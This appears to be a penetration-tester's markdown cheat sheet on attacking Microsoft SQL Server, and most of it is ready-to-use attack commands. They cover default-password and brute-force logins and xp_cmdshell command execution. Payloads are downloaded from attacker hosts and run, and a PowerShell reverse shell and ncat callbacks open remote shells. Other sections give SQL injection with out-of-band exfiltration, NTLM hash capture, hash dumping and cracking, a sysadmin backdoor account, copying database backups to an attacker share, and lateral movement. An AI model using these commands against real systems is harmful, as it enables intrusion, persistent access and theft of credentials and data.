---
id: Exploitation
aliases: []
tags:
  - Networking/Services/MSSQL/Exploitation
---

<!-- Exploitation {{{-->
# Exploitation

___

<!-- Credentials {{{-->
## Credentials

<!-- Default Credentials {{{-->
### Default Credentials

[[Usage#Connect|Connect]] with common default credentials

> [!info]-
>
> ```sh
> sa:<blank>
> sa:sa
> sa:password
> sa:Password
> sa:Password123
> sa:P@ssw0rd
> ```

> [!example]-
>
> ```sql
> impacket-mssqlclient sa@$target
> ```
>
> ```sql
> impacket-mssqlclient sa:sa@$target
> ```
>
> ```sql
> impacket-mssqlclient sa:password@$target
> ```

<!-- }}} -->

<!-- Brute Force {{{-->
### Brute Force

Brute force MSSQL service

<!-- Warning {{{-->
> [!warning]
>
> Brute forcing may block user accounts
<!-- }}} -->

<!-- Wordlists {{{-->
> [!tip]- Wordlists
>
> Usernames
>
> - [[SecLists#Usernames|SecLists]]
>
> ```sh
> /usr/share/seclists/Usernames/mssql-usernames-nansh0u-guardicore.txt
> ```
>
> Passwords
>
> - [[SecLists#Passwords|SecLists]]
>
> - [SecLists - mssql-betterdefaultpasslist.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt)
>
> ```sh
> /usr/share/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt
> ```
<!-- }}} -->

[[Hydra]]

```sh
hydra -L <usernames.txt> –P <passwords.txt> $target mssql
```

[[Medusa]]

```sh
medusa -h $target –U <usernames.txt> –P <passwords.txt> –M mssql
```

[[Nmap]]

```sh
nmap \
  $target \
  -p 1433 \
  --script ms-sql-brute \
  --script-args mssql.domain=<DOMAIN>,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts \
  -oA mssql-script-ms-sql-brute
```

<!-- Info {{{-->
> [!info]-
>
> - `mssql.domain=<DOMAIN>`: Use the NetBIOS name of the machine as domain
<!-- }}} -->

[[Metasploit]] — MSSQL Login Utility
(*[mssql-login](https://www.rapid7.com/db/modules/auxiliary/scanner/mssql/mssql_login/)*)

<!-- Tip {{{ -->
> [!tip]
>
> Set `DOMAIN` and use `USE_WINDOWS_AUTHENT` if domain is used
<!-- }}} -->


```sh
use auxiliary/scanner/mssql/mssql_login
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msf > use auxiliary/scanner/mssql/mssql_login
> msf auxiliary(mssql_login) > show actions
>     ...actions...
> msf auxiliary(mssql_login) > set ACTION < action-name >
> msf auxiliary(mssql_login) > show options
>     ...show and set options...
> msf auxiliary(mssql_login) > run
> ```
<!-- }}} -->

[CrackMapExex](https://github.com/byt3bl33d3r/CrackMapExec)

<!-- Warning {{{-->
> [!warning]
>
> **Deprecated**
<!-- }}} -->

```sh
crackmapexec mssql $target -d <domain_name> -u usernames.txt -p passwords.txt
```

> [!info]-
>
> - `-d <domain_name>`: Use the NetBIOS name of the machine as domain

<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

<!-- Enumeration {{{-->
## Enumeration

<!-- Server {{{-->
### Server

Identify server version (*e.g., name, os, build, etc.*)

Get machine name

```sql
SELECT @@SERVERNAME;
```

```sql
SELECT SERVERPROPERTY('MachineName');
```

Instance name

```sql
SELECT SERVERPROPERTY('InstanceName');
```

Cluster info

```sql
SELECT SERVERPROPERTY('IsClustered');
```

<!-- }}} -->

<!-- Version Info {{{-->
### Version Info

Identify MSSQL server version
to determine applicable exploits and vulnerabilities

MSSQL server version

```sql
SELECT @@version;
```

Product version

```sql
SELECT SERVERPROPERTY('ProductVersion');
```

```sql
SELECT SERVERPROPERTY('ProductLevel');
```

```sql
SELECT SERVERPROPERTY('Edition');
```

<!-- }}} -->

<!-- User {{{-->
### User

Enumerate user accounts and their permissions for privilege escalation
and for lateral movement

Get current user

```sql
SELECT USER_NAME();
```

```sql
SELECT SYSTEM_USER;
```

```sql
SELECT CURRENT_USER;
```

```sh
xp_cmdshell whoami
```

List all users

```sql
SELECT name FROM master.sys.server_principals;
```

```sql
SELECT name FROM sys.sysusers;
```

User privileges

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

```sh
xp_cmdshell whoami /priv
```

List sysadmin users

```sql
SELECT name FROM master.sys.server_principals
WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;
```

<!-- User Privileges {{{-->
#### User Privileges

Check user privileges and role memberships

Check if current user is sysadmin

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
```

Check server roles

```sql
SELECT name FROM master.sys.server_principals 
WHERE type = 'R';
```

Current user permissions

```sql
EXEC sp_helprotect;
```

Database role members

```sql
EXEC sp_helprolemember
```

<!-- }}} -->

<!-- }}} -->

<!-- Linked Servers {{{-->
### Linked Servers

Enumerate for [[#Linked Server|Linked Servers]] and test connections

List linked servers

```sql
EXEC sp_linkedservers;
```

```sql
SELECT * FROM sys.servers;
```

Test linked server connection

```sql
SELECT * FROM OPENQUERY([LinkedServerName], 'SELECT @@version');
```

Execute on linked server

```sql
EXEC ('SELECT @@version') AT [LinkedServerName];
```

<!-- }}} -->

<!-- Files & Directories {{{-->
### Files & Directories

List, read, and export files

Read file using
[OPENROWSET](https://learn.microsoft.com/en-us/sql/t-sql/functions/openrowset-transact-sql?view=sql-server-ver17)

```sql
SELECT * FROM OPENROWSET(
  BULK 'C:\Windows\System32\drivers\etc\hosts',
  SINGLE_CLOB
) AS Contents;
```

List directories with `xp_dirtree`

```sql
EXEC master..xp_dirtree 'C:\', 1, 1;
```

Check file existence with `xp_fileexist`

```sql
EXEC master..xp_fileexist 'C:\Windows\win.ini';
```

Export data with `BCP`

```sql
EXEC master..xp_cmdshell 'bcp "SELECT * FROM database.dbo.users" queryout "C:\users.txt" -c -T';
```

> [!warning]
>
> Requires [[#User Privileges|sysadmin]]

<!-- }}} -->

___
<!-- }}} -->

<!-- xp_cmdshell {{{-->
## xp_cmdshell

[xp_cdmshell (Transact-SQL)](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver17)
allows the execution of Windows command shell commands
directly from the SQL Server environment

<!-- General {{{-->
### General

<!-- Example {{{-->
> [!example]-
>
> Check service account
>
> ```sh
> EXEC xp_cmdshell 'whoami';
> ```
>
> Check network and role clues (*e.g., adapter names, domain names*)
>
> ```sh
> EXEC master..xp_cmdshell 'ipconfig';
> ```
>
> Check local accounts and group membership
>
> ```sh
> EXEC xp_cmdshell 'net user';
> ```
<!-- }}} -->

Enable **xp_cmdshell**

> [!warning]
>
> `ALTER SETTINGS` privileges required

```sql
EXEC sp_configure 'xp_cmdshell', 1;
```

```sh
enable_xp_cmdshell
```

<!-- Example {{{-->
> [!example]-
>
> ```sql
> EXEC sp_configure 'show advanced options', 1;
> ```
> ```sql
> RECONFIGURE;
> ```
> ```sql
> sp_configure;
> ```
> ```sql
> EXEC sp_configure 'xp_cmdshell', 1;
> ```
> ```sql
> RECONFIGURE;
> ```
<!-- }}} -->

Disable **xp_cmdshell** (*optional, for stealth*)

```sql
EXEC sp_configure 'xp_cmdshell', 0;
```

<!-- Example {{{-->
> [!example]-
>
> ```sql
> EXEC sp_configure 'xp_cmdshell', 0;
> ```
> ```sql
> RECONFIGURE;
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Command Execution {{{-->
#### Command Execution

Execute a command

```sql
EXEC xp_cmdshell '<command>';
```

```sh
xp_cmdshell whoami
```

```sh
xp_cmdshell whoami /priv
```

```sh
xp_cmdshell dir C:\
```

<!-- }}} -->

<!-- File Operations {{{-->
### File Operations

Read, Write, Copy, Download and Transfer files

Read a file

```sql
EXEC xp_cmdshell 'type C:\Windows\win.ini';
```

Write a file

```sql
EXEC xp_cmdshell 'echo test > C:\Temp\test.txt';
```

Copy a file

```sql
EXEC xp_cmdshell 'copy C:\source.txt C:\dest.txt';
```

Download a file from web

```sql
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://<attacker>/shell.exe -OutFile C:\Temp\shell.exe"';
```

Transfer a file

```sh
xp_cmdshell "powershell -c iwr http://<attacker_ip>:<attacke_port>/<file> -OutFile C:\Windows\Temp\<file>"
```

```sh
xp_cmdshell "powershell -c cd C:\Users\<user>\Downloads; wget http:<attacker_ip>/<file_name> -outfile <file_name>"
```

<!-- Example {{{-->
> [!example]-
>
> 1. **ATTACKER**: Serve a file via a simple
>    [[Transferring Files#Python HTTP Server|Python HTTP Server]]
>    to the target
>
> ```sh
> sudo python3 -m http.server 80
> ```
>
> 2. **TARGET**: Acquire the file served by the attacker
>
> ```sh
> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.15.127/ncat.exe -outfile ncat.exe"
> ```
>
> 3. **TARGET**: Execute the acquired file
>
> ```sh
> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\ncat.exe -e cmd.exe 10.10.15.127 1234
> ```
<!-- }}} -->

<!-- }}} -->

___

<!-- }}} -->

<!-- Privilege Escalation {{{-->
## Privilege Escalation

Escalate privileges using various MSSQL techniques

<!-- Example {{{-->
> [!example]-
>
> Check for impersonation permissions
>
> ```sql
> SELECT distinct b.name
> FROM sys.server_permissions a
> INNER JOIN sys.server_principals b
> ON a.grantor_principal_id = b.principal_id
> WHERE a.permission_name = 'IMPERSONATE';
> ```
>
> Impersonate `sysadmin` user
>
> ```sql
> EXECUTE AS LOGIN = 'sa';
> ```
> ```sql
> SELECT SYSTEM_USER;
> ```
> ```sql
> SELECT IS_SRVROLEMEMBER('sysadmin');
> ```
>
> Execute as different user
>
> ```sql
> EXECUTE AS USER = '<admin_user>';
> ```
>
> Revert to original context
>
> ```sql
> REVERT;
> ```
<!-- }}} -->

<!-- TRUSTWORTHY Database {{{-->
### TRUSTWORTHY Database

Check for `TRUSTWORTHY` database and high-privileged owner

> [!example]-
>
> ```sql
> SELECT
>   name,
>   database_id,
>   create_date,
>   is_trustworthy_on,
>   suser_sname(owner_sid) AS owner_name
> FROM sys.databases;
> ```
>
> - `is_trustworthy_on = 1`: Trustworthy database
> - `owner_name`: Check if high-privileged account

Exploit `TRUSTWORTHY` Database

> [!example]-
>
> If database is `TRUSTWORTHY` and has high-privileged `db_owner`
>
> ```sh
> USE master;
> EXEC sp_configure 'show advanced options',1;
> RECONFIGURE;
> EXEC sp_configure 'xp_cmdshell',1;
> RECONFIGURE;
> ```

<!-- }}} -->

___

<!-- }}} -->

<!-- SQL Injection {{{-->
## SQL Injection

Exploit SQL injection vulnerabilities in MSSQL applications

<!-- Example {{{-->
> [!example]-
>
> Stacked queries (*MSSQL allows multiple statements*)
>
> ```sql
> '; EXEC xp_cmdshell 'whoami'--
> ```
>
> Time-based blind injection
>
> ```sql
> '; WAITFOR DELAY '00:00:05'--
> ```
>
> UNION injection
>
> ```sql
> ' UNION SELECT null, @@version--
> ```
>
> Error-based injection
>
> ```sql
> ' AND 1=CONVERT(int, @@version)--
> ```
>
> Out-of-band data exfiltration
>
> ```sql
> '; DECLARE @data varchar(max); 
>   SELECT @data=name FROM master.sys.databases WHERE database_id=1;
>   EXEC('master..xp_dirtree "\\attacker.com\'+@data+'"')--
> ```
<!-- }}} -->

___

<!-- }}} -->

<!-- Password Hashes {{{-->
## Password Hashes

<!-- Extract Password Hash {{{-->
### Extract Password Hash

Extract password hashes

> [!warning]
>
> Requires `sysadmin`

```sql
SELECT name, password_hash FROM sys.sql_logins;
```

> [!tip]- Hash Cracking
>
> [[Hashcat]] — Crack MSSQL hashes
>
> ```sh
> hashcat -m 1731 hashes.txt rockyou.txt
> ```
>
> [[Metasploit]] — Crack MSSQL hashes
> (*[mssql_hashdump](https://www.rapid7.com/db/modules/auxiliary/scanner/mssql/mssql_hashdump/)*)
>
> ```sql
> use auxiliary/scanner/mssql/mssql_hashdump
> ```
>
> > [!example]-
> >
> >
> > ```sh
> > use auxiliary/scanner/mssql/mssql_hashdump
> > set RHOSTS $target
> > set USERNAME sa
> > set PASSWORD password
> > run
> > ```

<!-- }}} -->

<!-- NTLM Service Hash {{{-->
### NTLM Service Hash

Capture NTLM hashes

Force MSSQL to authenticate to attacker-controlled SMB shares

1. **ATTACKER**: Start [responder](https://github.com/lgandx/Responder)

```sh
sudo responder -I eth0
```

2. **TARGET**: Authenticate to the attacker machine

<!-- Example {{{-->
> [!example]-
>
> Call extended stored procedures on the target machine
>
> ```sh
> EXEC xp_dirtree '\\<attacker_ip>\<share>';
> ```
>
> ```sh
> EXEC xp_fileexist '\\<attacker_ip>\<share>\<file>';
> ```
>
> ```sh
> EXEC master..xp_subdirs '\\<attacker_ip>\<share>';
> ```
<!-- }}} -->

Capture NTLM hashes with [[Metasploit]]

> [!example]-
>
> 1. Start [responder](https://github.com/lgandx/Responder)
>
> ```sh
> sudo responder -I eth0
> ```
>
> 2. Microsoft SQL Server NTLM Stealer
> ([mssql_ntlm_stealer](https://www.rapid7.com/db/modules/auxiliary/admin/mssql/mssql_ntlm_stealer/))
>
> ```sh
> msf > use auxiliary/admin/mssql/mssql_sql
> msf auxiliary(mssql_sql) > show actions
>     ...actions...
> msf auxiliary(mssql_sql) > set ACTION < action-name >
> msf auxiliary(mssql_sql) > show options
>     ...show and set options...
> msf auxiliary(mssql_sql) > run
> ```
>
> > [!tip]
> > Set `DOMAIN` and `USE_WINDOWS_AUTHENT` if domain is used

> [!tip]- Hash Cracking
>
> [[Hashcat]] — Crack NTLM hash
>
> ```sh
> hashcat -m 5600 <hash.txt> <rockyou.txt>
> ```

<!-- }}} -->

___

<!-- }}} -->

<!-- Linked Server {{{-->
## Linked Server

Exploit linked servers for lateral movement and privilege escalation

> [!example]-
>
> Execute commands on linked server
>
> ```sql
> EXEC ('EXEC xp_cmdshell ''whoami''') AT [LinkedServer];
> ```
>
> Double hop to third server
>
> ```sql
> EXEC ('EXEC (''EXEC xp_cmdshell ''''whoami'''''') AT [Server3]') AT [Server2];
> ```

<!-- Privilege Escalation {{{-->
### Privilege Escalation

Exploit linked servers to escalate privileges

> [!example]-
>
> If linked server uses higher privileges
>
> ```sql
> EXEC ('EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT [LinkedServer];
> ```
> ```sql
> EXEC ('EXEC xp_cmdshell ''whoami''') AT [LinkedServer];
> ```
>
> RPC out enabled
>
> ```sql
> EXEC sp_serveroption @server='LinkedServer', @optname='rpc out', @optvalue='TRUE';
> ```

<!-- }}} -->

___

<!-- }}} -->

<!-- Persistence {{{-->
## Persistence

Establish persistent access to MSSQL systems

Create backdoor user with `sysadmin`

```sql
CREATE LOGIN backdoor WITH PASSWORD = 'P@ssw0rd123!';
```

```sql
EXEC sp_addsrvrolemember 'backdoor', 'sysadmin';
```
___
<!-- }}} -->

<!-- Reverse Shell {{{-->
## Reverse Shell

Establish reverse Shell connections through MSSQL

[[Netcat]]

> [!tip]
>
> [[#File Transfer]] [ncat](https://nmap.org/ncat/)

```sh
xp_cmdshell "powershell -c cd C:\Users\<user>\Downloads; .\nc64.exe -e cmd.exe <attacker_ip> <attacker_port>"
```

PowerShell

> [!example]-
>
> ```sql
> EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''<attacker_ip>'',<attacker_port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
> ```

[[Metasploit]]

> [!example]-
>
> Generate a payload with [[Msfvenom]]
>
> ```sh
> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f exe > shell.exe
> ```
>
> Upload via `xp_cmdshell`
>
> ```sql
> EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://attacker.com/shell.exe -OutFile C:\Temp\shell.exe"';
> ```
> ```sql
> EXEC xp_cmdshell 'C:\Temp\shell.exe';
> ```
>
> Download and execute payload
>
> ```sql
> EXEC xp_cmdshell 'certutil -urlcache -split -f <http://attacker.com/payload.exe> C:\Windows\Temp\<payload.exe>';
> ```
> ```sql
> EXEC xp_cmdshell 'C:\Windows\Temp\<payload.exe>';
> ```

___

<!-- }}} -->

<!-- Data Exfiltration {{{-->
## Data Exfiltration

Extract sensitive data from MSSQL databases

Database backup and export

> [!tip]
>
> Common System [[Networking/Services/MSSQL/General#Database|Databases]]

Export database to file

```sql
BACKUP DATABASE <targetDB> TO DISK = 'C:\Temp\backup.bak';
```

Copy to attacker's share (*if accessible*)

```sql
EXEC xp_cmdshell 'copy C:\Temp\backup.bak \\attacker-ip\share\backup.bak';
```

Export specific table

```sql
EXEC master..xp_cmdshell 'bcp "SELECT * FROM database.dbo.users" queryout "C:\users.txt" -c -T';
```
___
<!-- }}} -->

<!-- Lateral Movement {{{-->
## Lateral Movement

Move laterally through the network using MSSQL access

Domain enumeration

<!-- Example {{{-->
> [!example]-
>
> Enumerate domain users
>
> ```sql
> EXEC xp_cmdshell 'net user /domain';
> ```
>
> ```sql
> EXEC xp_cmdshell 'net group "Domain Admins" /domain';
> ```
>
> Enumerate shares
>
> ```sql
> EXEC xp_cmdshell 'net view \\$target';
> ```
<!-- }}} -->

Remote execution

<!-- Example {{{-->
> [!example]-
>
> Execute on remote system
>
> ```sql
> EXEC xp_cmdshell 'psexec \\$target -u domain\admin -p password cmd.exe';
> ```
>
> WMI lateral movement
>
> ```sql
> EXEC xp_cmdshell 'wmic /node:$target process call create "cmd.exe /c <payload.exe>"';
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->
